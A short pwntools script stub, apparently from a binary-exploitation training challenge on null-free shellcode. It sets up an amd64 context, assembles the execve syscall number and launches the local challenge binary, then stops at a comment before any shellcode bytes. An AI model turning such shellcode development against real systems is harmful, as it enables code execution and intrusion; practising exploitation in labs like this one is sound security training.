from pwn import *
context.clear(arch='amd64')
asm('mov rax, 59')
p = process("/challenge/binary-exploitation-null-free-shellcode")

# Raw shellcode bytes
